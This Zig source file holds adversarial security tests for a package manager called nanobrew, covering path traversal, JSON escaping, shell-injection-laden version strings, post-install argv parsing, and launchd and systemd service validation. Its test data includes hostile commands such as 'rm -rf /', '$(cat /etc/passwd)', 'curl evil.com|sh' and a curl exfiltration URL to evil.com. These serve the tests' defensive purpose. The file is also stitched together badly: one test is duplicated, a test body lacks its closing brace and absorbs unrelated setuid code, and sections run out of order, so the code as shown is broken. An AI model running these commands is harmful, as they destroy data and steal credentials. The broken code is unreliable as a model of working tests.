// security_test.zig — Adversarial security tests for nanobrew
//
// Tests injection attacks, buffer overflows, path traversal, and other
// attack vectors against nanobrew's defensive functions.

const std = @import("std");
const builtin = @import("builtin");
const testing = std.testing;

// Import the modules under test
const Database = @import("db/database.zig").Database;
const version = @import("version.zig");
const extract = @import("deb/extract.zig");
const placeholder = @import("platform/placeholder.zig");
const store = @import("store/store.zig");
const client = @import("api/client.zig");

const postinstall = @import("build/postinstall.zig");
const launchd = @import("services/launchd.zig");
const sandbox = @import("build/sandbox.zig");


// ────────────────────────────────────────────────────────────────────────
// 1. Path traversal in package names
// ────────────────────────────────────────────────────────────────────────

test "package name with path traversal is rejected" {
    // Direct traversal
    try testing.expect(!extract.isPathSafe("../../../etc/passwd"));
    try testing.expect(!extract.isPathSafe("../../etc/shadow"));
    try testing.expect(!extract.isPathSafe("../tmp/exploit"));

    // Traversal embedded in a longer path
    try testing.expect(!extract.isPathSafe("usr/share/../../../etc/passwd"));
    try testing.expect(!extract.isPathSafe("opt/nanobrew/../../root/.ssh/id_rsa"));

    // Double-encoded traversal patterns
    try testing.expect(!extract.isPathSafe("foo/../bar/../../../etc/passwd"));
}

test "package name with single dot components is safe" {
    // Single dots (current dir) are benign, not traversal
    try testing.expect(extract.isPathSafe("usr/./bin/hello"));
    try testing.expect(extract.isPathSafe("./usr/bin/hello"));
}

// ────────────────────────────────────────────────────────────────────────
// 2. Null bytes in strings
// ────────────────────────────────────────────────────────────────────────

test "writeJsonEscaped handles null bytes" {
    var buf: [256]u8 = undefined;
    var stream = std.io.fixedBufferStream(&buf);
    const writer = stream.writer();

    // Null byte must be escaped as \u0000, never passed through raw
    Database.writeJsonEscaped(writer, "before\x00after");
    const result = stream.getWritten();
    try testing.expectEqualStrings("before\\u0000after", result);

    // Verify no raw null byte exists in output
    try testing.expect(std.mem.indexOf(u8, result, &[_]u8{0}) == null);
}

test "writeJsonEscaped handles string of only null bytes" {
    var buf: [256]u8 = undefined;
    var stream = std.io.fixedBufferStream(&buf);
    const writer = stream.writer();

    Database.writeJsonEscaped(writer, "\x00\x00\x00");
    try testing.expectEqualStrings("\\u0000\\u0000\\u0000", stream.getWritten());
}
test "isPathSafe rejects paths with null bytes" {
    // Null bytes in paths can truncate the string at the OS level,
    // potentially allowing traversal past the visible path.
    try testing.expect(!extract.isPathSafe("usr/bin\x00/../../../etc/passwd"));

    // Null bytes without ".." must also be rejected — the OS may
    // truncate the path at the null byte, producing a different
    // effective path than what isPathSafe inspected.
    try testing.expect(!extract.isPathSafe("usr/bin/safe\x00"));
    try testing.expect(!extract.isPathSafe("\x00"));
    try testing.expect(!extract.isPathSafe("a/b\x00c/d"));
}
test "writeJsonEscaped handles very long input" {
    // 10KB of input data — must not crash or overflow
    const input = "A" ** 10240;
    var buf: [10240 + 64]u8 = undefined;
    var stream = std.io.fixedBufferStream(&buf);
    const writer = stream.writer();

    Database.writeJsonEscaped(writer, input);
    try testing.expectEqual(@as(usize, 10240), stream.getWritten().len);
}

test "writeJsonEscaped handles long input with many escapes" {
    // 1KB of characters that all need escaping (control chars)
    const input = "\x01" ** 1024;
    // Each \x01 becomes \u0001 (6 chars), so we need 6 * 1024 = 6144 bytes
    var buf: [6144 + 64]u8 = undefined;
    var stream = std.io.fixedBufferStream(&buf);
    const writer = stream.writer();

    Database.writeJsonEscaped(writer, input);
    try testing.expectEqual(@as(usize, 6144), stream.getWritten().len);
}

test "version comparison handles very long versions" {
    // Many segments: "1.2.3.4.5.6.7.8.9.10.11.12.13.14.15.16"
    const long_v = "1.2.3.4.5.6.7.8.9.10.11.12.13.14.15.16.17.18.19.20.21.22.23.24.25.26.27.28.29.30";
    // Must not crash; comparing to itself should be equal
    try testing.expectEqual(std.math.Order.eq, version.compareVersions(long_v, long_v));

    // Comparing two long but different versions
    const long_v2 = "1.2.3.4.5.6.7.8.9.10.11.12.13.14.15.16.17.18.19.20.21.22.23.24.25.26.27.28.29.31";
    try testing.expectEqual(std.math.Order.lt, version.compareVersions(long_v, long_v2));
}

// ────────────────────────────────────────────────────────────────────────
// 4. Malicious version strings
// ────────────────────────────────────────────────────────────────────────

test "version comparison handles shell injection characters" {
    // These strings should compare without crashing — they contain
    // shell metacharacters that could cause problems if ever passed to a shell
    const v1 = "1.0;rm -rf /";
    const v2 = "2.0";
    const result = version.compareVersions(v1, v2);
    // Just verify it returns a valid Order without crashing
    try testing.expect(result == .lt or result == .gt or result == .eq);
}

test "version comparison handles backtick injection" {
    const v1 = "1.0`whoami`";
    const v2 = "1.0";
    const result = version.compareVersions(v1, v2);
    try testing.expect(result == .lt or result == .gt or result == .eq);
}

test "version comparison handles dollar sign injection" {
    const v1 = "1.0$(cat /etc/passwd)";
    const v2 = "1.0";
    const result = version.compareVersions(v1, v2);
    try testing.expect(result == .lt or result == .gt or result == .eq);
}

test "version comparison handles pipe and redirect chars" {
    const v1 = "1.0|cat /etc/passwd";
    const v2 = "1.0>>/tmp/pwned";
    const result = version.compareVersions(v1, v2);
    try testing.expect(result == .lt or result == .gt or result == .eq);
}

test "version comparison handles empty and whitespace versions" {
    // Empty vs empty
    try testing.expectEqual(std.math.Order.eq, version.compareVersions("", ""));

    // Empty vs non-empty
    const result = version.compareVersions("", "1.0");
    try testing.expect(result == .lt or result == .gt or result == .eq);

    // Whitespace-only (non-numeric segment)
    const r2 = version.compareVersions("  ", "1.0");
    try testing.expect(r2 == .lt or r2 == .gt or r2 == .eq);
}

// ────────────────────────────────────────────────────────────────────────
// 5. Placeholder injection in binary-like files
// ────────────────────────────────────────────────────────────────────────

test "placeholder replacement in memory handles binary-safe content" {
    // replacePlaceholders works on in-memory slices; it should handle
    // input containing null bytes without crashing
    const alloc = testing.allocator;

    // Input with a placeholder surrounded by binary content
    const input = "some\x00binary@@HOMEBREW_CELLAR@@data\x00end";
    const result = try placeholder.replacePlaceholders(alloc, input);
    defer alloc.free(result);

    // The placeholder should still be replaced even in binary content
    // (the binary detection is in walkAndReplaceText, not replacePlaceholders)
    try testing.expect(std.mem.indexOf(u8, result, "@@HOMEBREW_CELLAR@@") == null);
}

test "placeholder replacement does not crash on very long input" {
    const alloc = testing.allocator;

    // 64KB of 'A' with a placeholder at the end
    const prefix = "A" ** (64 * 1024);
    const input = prefix ++ "@@HOMEBREW_PREFIX@@";
    const result = try placeholder.replacePlaceholders(alloc, input);
    defer alloc.free(result);

    try testing.expect(std.mem.indexOf(u8, result, "@@HOMEBREW_PREFIX@@") == null);
}

// ────────────────────────────────────────────────────────────────────────
// 6. JSON injection payloads
// ────────────────────────────────────────────────────────────────────────

test "writeJsonEscaped blocks nested JSON injection" {
    var buf: [256]u8 = undefined;
    var stream = std.io.fixedBufferStream(&buf);
    const writer = stream.writer();

    // Classic JSON injection: try to break out of a string value and inject new keys
    const payload = "name\",\"admin\":true,\"x\":\"";
    Database.writeJsonEscaped(writer, payload);
    const result = stream.getWritten();

    // ALL double quotes in the payload must be escaped
    try testing.expectEqualStrings("name\\\",\\\"admin\\\":true,\\\"x\\\":\\\"", result);

    // Verify every double quote in the output is preceded by a backslash
    for (result, 0..) |c, i| {
        if (c == '"') {
            // Every quote must be escaped (preceded by backslash)
            try testing.expect(i > 0 and result[i - 1] == '\\');
        }
    }
}

test "writeJsonEscaped handles all control characters u0000-u001f" {
    var buf: [512]u8 = undefined;
    var stream = std.io.fixedBufferStream(&buf);
    const writer = stream.writer();

    // Feed all 32 control characters (0x00 through 0x1F)
    var input: [32]u8 = undefined;
    for (0..32) |i| {
        input[i] = @intCast(i);
    }

    Database.writeJsonEscaped(writer, &input);
    const result = stream.getWritten();

    // No raw control character should appear in the output
    for (result) |c| {
        try testing.expect(c >= 0x20);
    }
}

test "writeJsonEscaped handles backslash-quote combo attack" {
    var buf: [128]u8 = undefined;
    var stream = std.io.fixedBufferStream(&buf);
    const writer = stream.writer();

    // Attack: \" — if only the quote is escaped but not the backslash,
    // the resulting \\" would end the string
    Database.writeJsonEscaped(writer, "\\\"");
    try testing.expectEqualStrings("\\\\\\\"", stream.getWritten());
}

test "writeJsonString wraps in quotes and escapes content" {
    var buf: [128]u8 = undefined;
    var stream = std.io.fixedBufferStream(&buf);
    const writer = stream.writer();

    Database.writeJsonString(writer, "hello\nworld");
    try testing.expectEqualStrings("\"hello\\nworld\"", stream.getWritten());
}

// ────────────────────────────────────────────────────────────────────────
// 7. Deep recursion protection
// ────────────────────────────────────────────────────────────────────────

test "resolver depth limit is reasonable" {
    // MAX_RESOLVE_DEPTH must be positive and bounded to prevent stack overflow
    const max_depth = @import("deb/resolver.zig").MAX_RESOLVE_DEPTH;
    try testing.expect(max_depth > 0);
    try testing.expect(max_depth <= 128);
    // Current value should be exactly 64
    try testing.expectEqual(@as(usize, 64), max_depth);
}

// ────────────────────────────────────────────────────────────────────────
// 8. isPathSafe edge cases
// ────────────────────────────────────────────────────────────────────────

test "isPathSafe rejects various traversal patterns" {
    // Standard traversal
    try testing.expect(!extract.isPathSafe("../"));
    try testing.expect(!extract.isPathSafe(".."));
    try testing.expect(!extract.isPathSafe("foo/../bar"));
    try testing.expect(!extract.isPathSafe("foo/./../../bar"));

    // Empty path
    try testing.expect(!extract.isPathSafe(""));

    // Deep traversal
    try testing.expect(!extract.isPathSafe("a/b/c/../../../../etc/passwd"));
}

test "isPathSafe accepts safe paths" {
    try testing.expect(extract.isPathSafe("usr/bin/hello"));
    try testing.expect(extract.isPathSafe("usr/share/doc/package/README.md"));
    try testing.expect(extract.isPathSafe("opt/nanobrew/lib/libz.so.1"));
    try testing.expect(extract.isPathSafe("a"));
    try testing.expect(extract.isPathSafe("."));
    try testing.expect(extract.isPathSafe("..."));
    try testing.expect(!extract.isPathSafe("/absolute/path"));
    try testing.expect(extract.isPathSafe("file..name"));
    try testing.expect(extract.isPathSafe("..hidden"));
}

test "isPathSafe handles paths with special characters" {
    // Spaces, unicode, etc. should be safe as long as no ".." component
    try testing.expect(extract.isPathSafe("usr/share/my package/file"));
    try testing.expect(extract.isPathSafe("usr/lib/libcurl.so.4.8.0"));

    // But traversal with special chars is still caught
    try testing.expect(!extract.isPathSafe("usr/share/my package/../../etc"));
}

test "isPathSafe handles very long paths" {
    // A very long but safe path should not crash
    const long_path = "a/" ** 512 ++ "file.txt";
    try testing.expect(extract.isPathSafe(long_path));

    // A very long path with traversal at the end
    const long_bad = "a/" ** 512 ++ "../etc/passwd";
    try testing.expect(!extract.isPathSafe(long_bad));
}

test "symlink target resolved path must stay within dest_dir" {
    try testing.expect(extract.isLinkTargetSafe("usr/bin/link", "../../etc/passwd", "/tmp/dest"));
    try testing.expect(extract.isLinkTargetSafe("usr/bin/link", "../lib/libfoo.so", "/tmp/dest"));
    try testing.expect(!extract.isLinkTargetSafe("usr/bin/link", "../../../etc/passwd", "/tmp/dest"));
    try testing.expect(!extract.isLinkTargetSafe("a/link", "../../outside", "/tmp/dest"));
    try testing.expect(!extract.isLinkTargetSafe("usr/bin/link", "/etc/passwd", "/tmp/dest"));
    try testing.expect(!extract.isLinkTargetSafe("usr/bin/link", "../lib\x00/../../etc/passwd", "/tmp/dest"));
}

test "tar extraction strips setuid and setgid bits from mode" {
    const raw_mode: u32 = 0o4755;
    try testing.expectEqual(@as(u32, 0o0755), raw_mode & 0o0777);
    const raw_mode2: u32 = 0o6755;
    try testing.expectEqual(@as(u32, 0o0755), raw_mode2 & 0o0777);
    const raw_mode3: u32 = 0o1755;
    try testing.expectEqual(@as(u32, 0o0755), raw_mode3 & 0o0777);
}

// ────────────────────────────────────────────────────────────────────────
// 11. HTTPS enforcement for API and bottle domain env var overrides
// ────────────────────────────────────────────────────────────────────────

test "isValidDomainOverride rejects non-HTTPS URLs" {
    try testing.expect(!client.isValidDomainOverride("http://evil.com/api/"));
    try testing.expect(!client.isValidDomainOverride("ftp://evil.com/"));
    try testing.expect(!client.isValidDomainOverride("javascript:alert(1)"));
    try testing.expect(!client.isValidDomainOverride(""));
    try testing.expect(!client.isValidDomainOverride("file:///etc/passwd"));
    try testing.expect(client.isValidDomainOverride("https://formulae.brew.sh/api/formula/"));
    try testing.expect(client.isValidDomainOverride("https://my-mirror.example.com/"));

    // The extraction mode mask should strip setuid (04000), setgid (02000),
    // and sticky (01000) bits. Only rwxrwxrwx (0o777) should be preserved.
    const raw_mode: u32 = 0o4755; // setuid + rwxr-xr-x
    const safe_mode = raw_mode & 0o0777;
    try testing.expectEqual(@as(u32, 0o0755), safe_mode);

    const raw_mode2: u32 = 0o6755; // setuid + setgid
    const safe_mode2 = raw_mode2 & 0o0777;
    try testing.expectEqual(@as(u32, 0o0755), safe_mode2);

    const raw_mode3: u32 = 0o1755; // sticky
    const safe_mode3 = raw_mode3 & 0o0777;
    try testing.expectEqual(@as(u32, 0o0755), safe_mode3);

// ────────────────────────────────────────────────────────────────────────
// 10. Shell injection in post-install script parsing
// ────────────────────────────────────────────────────────────────────────

test "parseSystemCall returns separate argv elements, not a flat shell string" {
    const alloc = testing.allocator;
    const keg = "/opt/nanobrew/prefix/Cellar/test/1.0";

    // Simulate: system "/bin/rm", "-rf", "/"
    // The old code would join this into "/bin/rm -rf /" and pass to /bin/sh -c
    // The new code must return separate argv elements
    const parsed = postinstall.parseSystemCall(alloc, "\"/bin/rm\", \"/tmp/target\"", keg) orelse {
        return error.TestUnexpectedResult;
    };
    defer parsed.deinit(alloc);

    // Must have exactly 2 separate argv elements — NOT a single shell string
    try testing.expectEqual(@as(usize, 2), parsed.argv.len);
    try testing.expectEqualStrings("/bin/rm", parsed.argv[0]);
    try testing.expectEqualStrings("/tmp/target", parsed.argv[1]);

    // Verify: the result is an argv slice, not a flat string that could be
    // passed to /bin/sh -c. Each argument is its own element.
    // If this were the old code, it would be a single "rm /tmp/target" string.
}

test "parseSystemCall preserves shell metacharacters as data, not commands" {
    const alloc = testing.allocator;
    const keg = "/opt/nanobrew/prefix/Cellar/test/1.0";

    // Shell metacharacters in arguments must remain literal data in argv
    // elements and never be interpreted by a shell.
    const parsed = postinstall.parseSystemCall(
        alloc,
        "\"/usr/bin/echo\", \"/tmp/hello; rm -rf /\", \"/tmp/$(whoami)\"",
        keg,
    ) orelse {
        return error.TestUnexpectedResult;
    };
    defer parsed.deinit(alloc);

    try testing.expectEqual(@as(usize, 3), parsed.argv.len);
    try testing.expectEqualStrings("/usr/bin/echo", parsed.argv[0]);
    // The semicolon and rm command must be a single literal argument,
    // not split or interpreted by a shell. Because the value starts
    // with '/', resolvePath returns it verbatim.
    try testing.expectEqualStrings("/tmp/hello; rm -rf /", parsed.argv[1]);
    // The $() must be a literal string, not a command substitution
    try testing.expectEqualStrings("/tmp/$(whoami)", parsed.argv[2]);
}

test "parseSystemCall with backtick injection stays as argv element" {
    const alloc = testing.allocator;
    const keg = "/opt/nanobrew/prefix/Cellar/test/1.0";

    const parsed = postinstall.parseSystemCall(
        alloc,
        "\"/usr/bin/env\", \"/tmp/`cat /etc/shadow`\"",
        keg,
    ) orelse {
        return error.TestUnexpectedResult;
    };
    defer parsed.deinit(alloc);

    try testing.expectEqual(@as(usize, 2), parsed.argv.len);
    try testing.expectEqualStrings("/usr/bin/env", parsed.argv[0]);
    // Backticks must be preserved as literal text in the argument,
    // not interpreted as shell command substitution
    try testing.expectEqualStrings("/tmp/`cat /etc/shadow`", parsed.argv[1]);
}

// ────────────────────────────────────────────────────────────────────────
// 9. SHA256 validation in store paths
// ────────────────────────────────────────────────────────────────────────

test "isValidSha256 rejects non-hex strings" {
    try testing.expect(!store.isValidSha256("../../etc"));
    try testing.expect(!store.isValidSha256(""));
    try testing.expect(!store.isValidSha256("abc"));
    try testing.expect(!store.isValidSha256("zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz"));
    try testing.expect(store.isValidSha256("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"));
}

// 11. HTTPS enforcement for API and bottle domain env var overrides
// ────────────────────────────────────────────────────────────────────────

test "isValidDomainOverride rejects non-HTTPS URLs" {
    try testing.expect(!client.isValidDomainOverride("http://evil.com/api/"));
    try testing.expect(!client.isValidDomainOverride("ftp://evil.com/"));
    try testing.expect(!client.isValidDomainOverride("javascript:alert(1)"));
    try testing.expect(!client.isValidDomainOverride(""));
    try testing.expect(!client.isValidDomainOverride("file:///etc/passwd"));
    // Valid
    try testing.expect(client.isValidDomainOverride("https://formulae.brew.sh/api/formula/"));
    try testing.expect(client.isValidDomainOverride("https://my-mirror.example.com/"));
}

// ────────────────────────────────────────────────────────────────────────
// 12. Launchd plist content validation
// ────────────────────────────────────────────────────────────────────────

test "isPlistSafe rejects plist with UserName root" {
    const plist =
        \\<?xml version="1.0" encoding="UTF-8"?>
        \\<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        \\<plist version="1.0">
        \\<dict>
        \\  <key>Label</key>
        \\  <string>homebrew.mxcl.evil</string>
        \\  <key>UserName</key>
        \\  <string>root</string>
        \\  <key>ProgramArguments</key>
        \\  <array>
        \\    <string>/opt/nanobrew/prefix/Cellar/evil/1.0/bin/evil</string>
        \\  </array>
        \\</dict>
        \\</plist>
    ;
    try testing.expect(!launchd.isPlistSafe(plist, "/opt/nanobrew/prefix/Cellar"));
}

test "isPlistSafe rejects plist with ProgramArguments outside keg" {
    const plist =
        \\<?xml version="1.0" encoding="UTF-8"?>
        \\<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        \\<plist version="1.0">
        \\<dict>
        \\  <key>Label</key>
        \\  <string>homebrew.mxcl.evil</string>
        \\  <key>ProgramArguments</key>
        \\  <array>
        \\    <string>/usr/bin/curl</string>
        \\    <string>http://evil.com/steal?data=/etc/passwd</string>
        \\  </array>
        \\</dict>
        \\</plist>
    ;
    try testing.expect(!launchd.isPlistSafe(plist, "/opt/nanobrew/prefix/Cellar"));
}

test "isPlistSafe accepts safe plist with ProgramArguments inside keg" {
    const plist =
        \\<?xml version="1.0" encoding="UTF-8"?>
        \\<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        \\<plist version="1.0">
        \\<dict>
        \\  <key>Label</key>
        \\  <string>homebrew.mxcl.redis</string>
        \\  <key>ProgramArguments</key>
        \\  <array>
        \\    <string>/opt/nanobrew/prefix/Cellar/redis/7.2.4/bin/redis-server</string>
        \\    <string>/opt/nanobrew/prefix/Cellar/redis/7.2.4/etc/redis.conf</string>
        \\  </array>
        \\</dict>
        \\</plist>
    ;
    try testing.expect(launchd.isPlistSafe(plist, "/opt/nanobrew/prefix/Cellar"));
}

// ────────────────────────────────────────────────────────────────────────
// 13. systemd service file validation
// ────────────────────────────────────────────────────────────────────────

const systemd = @import("services/systemd.zig");

test "isServiceFileSafe rejects User=root" {
    const content =
        \\[Unit]
        \\Description=Evil Service
        \\
        \\[Service]
        \\User=root
        \\ExecStart=/opt/nanobrew/prefix/Cellar/pkg/1.0/bin/mybin
        \\
        \\[Install]
        \\WantedBy=multi-user.target
    ;
    try testing.expect(!systemd.isServiceFileSafe(content, "/opt/nanobrew/prefix/Cellar"));
}

test "isServiceFileSafe rejects ExecStart outside keg" {
    const content =
        \\[Unit]
        \\Description=Malicious Service
        \\
        \\[Service]
        \\ExecStart=/bin/bash -c 'curl evil.com|sh'
        \\
        \\[Install]
        \\WantedBy=multi-user.target
    ;
    try testing.expect(!systemd.isServiceFileSafe(content, "/opt/nanobrew/prefix/Cellar"));
}

test "isServiceFileSafe accepts safe service file with ExecStart inside keg" {
    const content =
        \\[Unit]
        \\Description=Safe Service
        \\
        \\[Service]
        \\User=_myservice
        \\ExecStart=/opt/nanobrew/prefix/Cellar/mypkg/1.0/bin/mypkg --config /etc/mypkg.conf
        \\
        \\[Install]
        \\WantedBy=multi-user.target
    ;
    try testing.expect(systemd.isServiceFileSafe(content, "/opt/nanobrew/prefix/Cellar"));
}

test "database MAX_DB_SIZE is larger than old 1 MiB limit" {
    try testing.expect(Database.MAX_DB_SIZE > 1024 * 1024);
    try testing.expectEqual(@as(usize, 16 * 1024 * 1024), Database.MAX_DB_SIZE);
}

// ────────────────────────────────────────────────────────────────────────
// 14. Sandbox profile generation
// ────────────────────────────────────────────────────────────────────────

test "sandbox profile contains keg path and no unreplaced placeholders" {
    const alloc = testing.allocator;
    const keg = "/opt/nanobrew/prefix/Cellar/wget/1.24.5";
    const profile = try sandbox.generateProfile(alloc, keg);
    defer alloc.free(profile);

    // Profile must contain the keg path
    try testing.expect(std.mem.indexOf(u8, profile, keg) != null);

    // No unreplaced placeholders
    try testing.expect(std.mem.indexOf(u8, profile, "@@KEG_PATH@@") == null);

    // Contains key deny rules
    try testing.expect(std.mem.indexOf(u8, profile, "(deny network") != null);
    try testing.expect(std.mem.indexOf(u8, profile, "(deny default)") != null);
}

test "sandbox profile rejects keg path with shell metacharacters" {
    const alloc = testing.allocator;
    const result = sandbox.generateProfile(alloc, "/opt/nanobrew/\"evil");
    try testing.expectError(error.UnsafeKegPath, result);
}

test "sandboxedArgv prepends sandbox-exec on macOS" {
    const alloc = testing.allocator;
    const original = &[_][]const u8{ "mkdir", "-p", "/some/path" };
    const result = try sandbox.sandboxedArgv(alloc, original, "/opt/nanobrew/prefix/Cellar/pkg/1.0");
    defer {
        for (result.argv) |arg| alloc.free(@constCast(arg));
        alloc.free(result.argv);
        if (result.profile.len > 0) alloc.free(result.profile);
    }

    if (comptime builtin.os.tag == .macos) {
        try testing.expectEqual(original.len + 3, result.argv.len);
        try testing.expectEqualStrings("sandbox-exec", result.argv[0]);
    } else {
        try testing.expectEqual(original.len, result.argv.len);
    }
}
